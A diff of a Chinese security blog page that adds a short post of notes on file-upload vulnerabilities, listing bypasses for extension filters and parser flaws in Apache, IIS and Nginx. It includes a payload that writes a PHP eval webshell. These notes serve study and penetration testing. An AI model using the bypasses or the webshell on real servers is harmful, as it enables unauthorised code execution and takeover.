@@ -8,14 +8,14 @@
     <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
     <meta name="viewport" content="width=device-width, initial-scale=1">
     
-    <meta name="description" content="star，渗透测试人员, python爱好者,生活探险家 | 这里是 Star的博客，与你一起发现更大的世界。">
+    <meta name="description" content="简介">
     
     <meta name="keyword"  content="Star, , Star的网络日志, 博客, 个人网站">
     <link rel="shortcut icon" href="/img/favicon.ico">
 
-    <title>3理财-Star&#39;s Blog</title>
+    <title>上传漏洞-Star&#39;s Blog</title>
 
-    <link rel="canonical" href="/categories/3%E7%90%86%E8%B4%A2/">
+    <link rel="canonical" href="/post/upload/">
 
     <link rel="stylesheet" href="/css/iDisqus.min.css"/>
 	
@@ -150,14 +150,35 @@ if (!doNotTrack) {
 
 
 
-<header class="intro-header" style="background-image: url('/img/home-bg-jeep.jpg')">
+
+<style type="text/css">
+    header.intro-header {
+        background-image: url('/img/home-bg-jeep.jpg')
+    }
+</style>
+<header class="intro-header">
     <div class="container">
         <div class="row">
-            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1 ">
-                <div class="site-heading">
-                    <h1>Star&#39;s Blog </h1>
-                    
-		    <span class="subheading">路在脚下，心向远方</span>
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                        <a class="tag" href="/tags/%E4%B8%8A%E4%BC%A0" title="上传">
+                            上传
+                        </a>
+                        
+                    </div>
+                    <h1>上传漏洞</h1>
+                    <h2 class="subheading"></h2>
+                    <span class="meta">
+			Posted by 
+			
+			         &#34;star&#34;
+			 
+			on 
+			Sunday, February 3, 2019
+                        
+                    </span>
                 </div>
             </div>
         </div>
@@ -166,163 +187,166 @@ if (!doNotTrack) {
 
 
 
-  
-<div class="container">
-    <div class="row">
-        
-        
-   	    <div class="
-            col-lg-8 col-lg-offset-1
-            col-md-8 col-md-offset-1
-            col-sm-12
-            col-xs-12
-            post-container
-        ">
-            
 
-<div class="post-preview">
-    <a href="https://star-safe.github.io/post/financial/">
-        <h2 class="post-title">
-            投资理财
-        </h2>
+<article>
+    <div class="container">
+        <div class="row">
+
+            
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                
+                <header>
+                    <h2>TOC</h2>
+                </header>
+                
+                
+                <p>一、客户端绕过。<br />
+基本上都是js起作用。<br />
+1.禁用本地js。<br />
+2.按f12更改本地js代码。<br />
+3.上传jpg通过burpsuite更改为网站代码语言（例如php）。<br />
+二、绕过黑名单<br />
+1.黑名单不全（没有过滤php等或者有解析漏洞）<br />
+2.特殊文件名——大小写绕过(PhP)、双后缀（pphphp）、空格绕过、点绕过（php ,php.）<br />
+3.黑名单之截断绕过（1.asp%00.jpg）<br />
+4. .htaccess文件攻击（未完）<br />
+三、白名单绕过<br />
+1.白名单之截断绕过（1.asp%00.jpg）<br />
+2.白名单之解析漏洞绕过<br />
+四、文件内容检测绕过<br />
+1.制作图片马（opy 1.jpg/b+1.php 2.jpg ）<br />
+2.在文件的开头加上幻术头（类似GIF89A）</p>
+
+<p>附录：解析漏洞<br />
+一、apache<br />
+xx.php.owf.rar<br />
+二、iis6.0<br />
+1./xx.asp/xx.jpg<br />
+2.xx.asp;.jpg<br />
+3.默认可执行文件除了asp还包含这三种<br />
+/xx.asa<br />
+/xx.cer<br />
+/xx.cdx<br />
+三、S 7.0/ Nginx <8.03畸形解析漏洞  
+在默认Fast-CGI开启状况下,上传一个名字为wooyun.jpg，内容为  
+<?PHP fputs(fopen('shell.php','w'),'<?php eval($_POST[cmd])?>&rsquo;);?&gt;
+的文件，然后访问wooyun.jpg/x.php,在这个目录下就会生成一句话木马 shell.php
+四、Nginx &lt;8.03 空字节代码执行漏洞<br />
+影响版本:0.5.,0.6, 0.7 &lt;= 0.7.65, 0.8 &lt;= 0.8.37 Nginx<br />
+xx.jpg%00.php</p>
+
+
+                
+                
+<div class="entry-shang text-center">
+    
+	    <p>「真诚赞赏，手留余香」</p>
 	
-        <h3 class="post-subtitle">
-            小标题
-        </h3>
-	
-        <div class="post-content-preview">
-	
-            简介
-        
-        </div>
-    </a>
-    <p class="post-meta">
-    Posted by      &#34;star&#34; Sunday, February 3, 2019
-    </p>
+	<button class="zs show-zs btn btn-bred">赞赏支持</button>
 </div>
-<hr>
-
-
-            
-
-
-
-       	</div>
+<div class="zs-modal-bg"></div>
+<div class="zs-modal-box">
+	<div class="zs-modal-head">
+		<button type="button" class="close">×</button>
+		<span class="author"><a href="https://star-safe.github.io"><img src="/img/favicon.png" />Star&#39;s Blog</a></span>
         
-
-<div class="
-    col-lg-3 col-lg-offset-0
-    col-md-3 col-md-offset-0
-    col-sm-12
-    col-xs-12
-    sidebar-container
-">
-    
-    
-    <section>
-        <hr class="hidden-sm hidden-xs">
-        <h5>FEATURED TAGS</h5>
-        <div class="tags">
-             
-            
-                
-                    <a href="/tags/tag1" title="tag1">
-                        tag1
-                    </a>
-                
-            
-                
-                    <a href="/tags/tag2" title="tag2">
-                        tag2
-                    </a>
-                
-            
-                
-            
-        </div>
-    </section>
-    
-
-    
-    <section class="visible-md visible-lg">
-        <hr><h5><a href="">ABOUT ME</a></h5>
-        <div class="short-about">
-            
-            <img src="/img/me.jpg" />
-            
-            
-                <p>一个白帽子</p>
-            
-           
-           <ul class="list-inline"> 
-               
-               <li>
-                   <a href="https://star-safe.github.io/categories/3%E7%90%86%E8%B4%A2/index.xml" rel="alternate" type="application/rss+xml" title="Star&#39;s Blog" >
-                       <span class="fa-stack fa-lg">
-                           <i class="fa fa-circle fa-stack-2x"></i>
-                           <i class="fa fa-rss fa-stack-1x fa-inverse"></i>
-                       </span>
-                   </a>
-               </li>
-               
-               
-               
-               
-               
-               
-               <li>
-                   <a target="_blank" href="/your%20wechat%20qr%20code%20image">
-                       <span class="fa-stack fa-lg">
-                           <i class="fa fa-circle fa-stack-2x"></i>
-                           <i class="fa fa-wechat fa-stack-1x fa-inverse"></i>
-                       </span>
-                   </a>
-               </li>
-               
-               
-               <li>
-                   <a target="_blank" href="https://github.com/yourgithub">
-                       <span class="fa-stack fa-lg">
-                           <i class="fa fa-circle fa-stack-2x"></i>
-                           <i class="fa fa-github fa-stack-1x fa-inverse"></i>
-                       </span>
-                   </a>
-               </li>
-               
-               
-               <li>
-                   <a target="_blank" href="https://www.linkedin.com/in/yourlinkedinid">
-                       <span class="fa-stack fa-lg">
-                           <i class="fa fa-circle fa-stack-2x"></i>
-                           <i class="fa fa-linkedin fa-stack-1x fa-inverse"></i>
-                       </span>
-                   </a>
-               </li>
-               
-               
-                </ul>
-            </div>
-    </section>
-    
-    
-    <section>
-        <hr class="hidden-sm hidden-xs">
-        <h5>友链</h5>
-        <ul class="list-inline">
-            
-            <li><a target="_blank" href="https://aoii103.github.io">aoii103的博客</a></li>
-            
-        </ul>
-    </section>
-    
-
-    
-    
-</div>
-
+	        <p class="tip"><i></i><span>真诚赞赏，手留余香</span></p>
+		
+ 
+	</div>
+	<div class="zs-modal-body">
+		<div class="zs-modal-btns">
+			<button class="btn btn-blink" data-num="2">2元</button>
+			<button class="btn btn-blink" data-num="5">5元</button>
+			<button class="btn btn-blink" data-num="10">10元</button>
+			<button class="btn btn-blink" data-num="50">50元</button>
+			<button class="btn btn-blink" data-num="100">100元</button>
+			<button class="btn btn-blink" data-num="1">任意金额</button>
+		</div>
+		<div class="zs-modal-pay">
+			<button class="btn btn-bred" id="pay-text">2元</button>
+			<p>使用<span id="pay-type">微信</span>扫描二维码完成支付</p>
+			<img src="/img/reward/wechat-2.png"  id="pay-image"/>
+		</div>
+	</div>
+	<div class="zs-modal-footer">
+		<label><input type="radio" name="zs-type" value="wechat" class="zs-type" checked="checked"><span ><span class="zs-wechat"><img src="/img/reward/wechat-btn.png"/></span></label>
+		<label><input type="radio" name="zs-type" value="alipay" class="zs-type" class="zs-alipay"><img src="/img/reward/alipay-btn.png"/></span></label>
 	</div>
 </div>
+<script type="text/javascript" src="/js/reward.js"></script>
 
+                
+
+                <hr>
+                <ul class="pager">
+                    
+                    
+                    <li class="next">
+                        <a href="/post/operations/" data-toggle="tooltip" data-placement="top" title="运维笔记">Next
+                            Post &rarr;</a>
+                    </li>
+                    
+                </ul>
+
+                
+<div id="disqus-comment"></div>
+
+
+
+            </div>
+            
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                
+                
+                <section>
+                    <hr class="hidden-sm hidden-xs">
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                        
+                        
+                        
+                        <a href="/tags/tag1" title="tag1">
+                            tag1
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/tag2" title="tag2">
+                            tag2
+                        </a>
+                        
+                        
+                        
+                        
+                    </div>
+                </section>
+                
+
+                
+                
+                <section>
+                    <hr>
+                    <h5>友链</h5>
+                    <ul class="list-inline">
+                        
+                        <li><a target="_blank" href="https://aoii103.github.io">aoii103的博客</a></li>
+                        
+                    </ul>
+                </section>
+                
+            </div>
+        </div>
+    </div>
+</article>
 
 
 
@@ -334,7 +358,7 @@ if (!doNotTrack) {
 <ul class="list-inline text-center">
    
    <li>
-       <a href="https://star-safe.github.io/categories/3%E7%90%86%E8%B4%A2/index.xml" rel="alternate" type="application/rss+xml" title="Star&#39;s Blog" >
+       <a href="" rel="alternate" type="application/rss+xml" title="Star&#39;s Blog" >
    <span class="fa-stack fa-lg">
        <i class="fa fa-circle fa-stack-2x"></i>
        <i class="fa fa-rss fa-stack-1x fa-inverse"></i>
